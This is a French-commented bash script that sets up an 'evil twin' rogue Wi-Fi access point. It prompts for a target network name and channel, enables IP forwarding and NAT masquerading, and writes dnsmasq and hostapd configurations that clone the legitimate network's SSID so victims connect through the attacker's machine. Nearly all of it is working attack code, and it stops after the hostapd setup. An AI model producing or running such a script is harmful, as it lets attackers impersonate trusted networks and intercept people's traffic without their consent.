#!/bin/bash

int_reseau=

#Changer la variable selon le nom de votre carte ethernet, souvent eth0 ou wlan1
int_iptables=eth0

#------------------------------CHOIX DU WiFi-------------------------------------

#Demander à l'utilisateur de renter le nom du réseau WiFi ainsi que le channel 

cd eviltwin

echo -e "\nEntrez le réseau WiFi"
read essid
echo "Entrez le channel"
read channel

#----------------------------------CONFIGURATION MODE ROUTEUR--------------------

#On configure ici le mode routeur afin de donner accès à Internet depuis notre AP qui usurpe l’identité de celui avec le plus de trafic.

echo " "

#On met notre système en mode routeur (forward)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

#Nettoyage de la table de routage
sudo iptables -t nat -X
sudo iptables -t nat -F

#Configurer le pare-feu pour tagguer les trames et les router

sudo iptables -I POSTROUTING -t nat -o $int_iptables -j MASQUERADE

#Rendre la gateway fournit accessible : (l’IP de l’interface AP)
sudo ip addr add 192.168.1.254/24 dev $int_reseau

echo "Configuration du mode routeur : OK"

#-----------------------------------------CONFIG DNSMASQ--------------------------

#Configuration de DNSMASQ pour donner une configuration DHCP au sein de notre AP.

#Création du fichier dnsmasq.conf
touch dnsmasq.conf

echo "interface=$int_reseau" > dnsmasq.conf
echo "port=5353" >> dnsmasq.conf

#Permet d’attribuer une IP à la victime dans une plage définie
echo "dhcp-range=192.168.1.10,192.168.1.100,12h" >> dnsmasq.conf

#Permet de définir le DNS
echo "dhcp-option=6,8.8.8.8" >> dnsmasq.conf

#Permet de définir la passerelle du réseau
echo "dhcp-option=3,192.168.1.254" >> dnsmasq.conf

echo "Configuration DNSMASQ : OK"

#-----------------------------------------CONFIG HOSTAPD-----------------------------

#Configuration de HOSTAPD afin de devenir un point d’accès qui usurpe un point d’accès légitime.

#Création du fichier hostapd.conf
touch hostapd.conf

#Ajout de l’interface du point d’accès
echo "interface=$int_reseau" > hostapd.conf
 
 #Ajout du driver nl80211
echo "driver=nl80211" >> hostapd.conf

#Ajout du SSID (avec le plus de trafic)
echo "ssid=$essid" >> hostapd.conf 

#Mode G de Wi-Fi (g = 2.4GHz)
echo "hw_mode=g" >> hostapd.conf 

#Ajout du channel correspondant à celui usurper
echo "channel=$channel" >> hostapd.conf

echo "Configuration HOSTAPD : OK"


